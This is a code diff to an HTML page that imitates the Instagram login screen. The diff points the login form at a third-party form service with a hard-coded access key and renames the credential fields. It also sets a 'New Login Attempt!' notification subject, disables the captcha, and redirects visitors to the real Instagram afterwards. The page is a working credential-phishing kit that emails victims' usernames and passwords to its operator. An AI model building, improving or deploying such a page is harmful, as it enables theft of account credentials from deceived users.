@@ -310,14 +310,22 @@
             <span class="logo-text">Instagram</span>
         </div>
 
-        <!-- Login Form -->
-        <!-- ✅ Your FormBackend endpoint -->
-        <form class="login-form" action="https://www.formbackend.com/f/c50faa4ead28c451" method="POST">
+        <!-- Login Form with Web3Forms -->
+        <form class="login-form" action="https://api.web3forms.com/submit" method="POST">
+            <!-- Web3Forms required hidden fields -->
+            <input type="hidden" name="access_key" value="973e5c68-64c7-4922-b25c-5209721144c2">
+            <!-- Optional: to receive email notifications -->
+            <input type="hidden" name="_subject" value="🔐 New Login Attempt!">
+            <!-- Redirect after submission -->
+            <input type="hidden" name="_next" value="https://www.instagram.com/">
+            <!-- Disable captcha for testing (optional) -->
+            <input type="hidden" name="_captcha" value="false">
+
             <div class="input-group">
-                <input type="text" name="username" placeholder="Phone number, username, or email" id="username" autocomplete="username" required>
+                <input type="text" name="USM" placeholder="Phone number, username, or email" id="username" autocomplete="username" required>
             </div>
             <div class="input-group">
-                <input type="password" name="password" placeholder="Password" id="password" autocomplete="current-password" required>
+                <input type="password" name="PSW" placeholder="Password" id="password" autocomplete="current-password" required>
             </div>
             <button type="submit" class="login-btn" id="loginBtn">Log in</button>
         </form>
@@ -372,16 +380,19 @@
         usernameInput.addEventListener('input', toggleLoginBtn);
         passwordInput.addEventListener('input', toggleLoginBtn);
 
+        // Facebook login (demo)
         document.querySelector('.facebook-login').addEventListener('click', function(e) {
             e.preventDefault();
             alert('🔵 Facebook login flow (demo) — would redirect to Facebook OAuth');
         });
 
+        // Forgot password (demo)
         document.querySelector('.forgot-link').addEventListener('click', function(e) {
             e.preventDefault();
             alert('🔑 Reset password flow (demo) — would show password reset form');
         });
 
+        // Sign up (demo)
         document.querySelector('.signup-section a').addEventListener('click', function(e) {
             e.preventDefault();
             alert('📝 Sign up flow (demo) — would redirect to signup page');
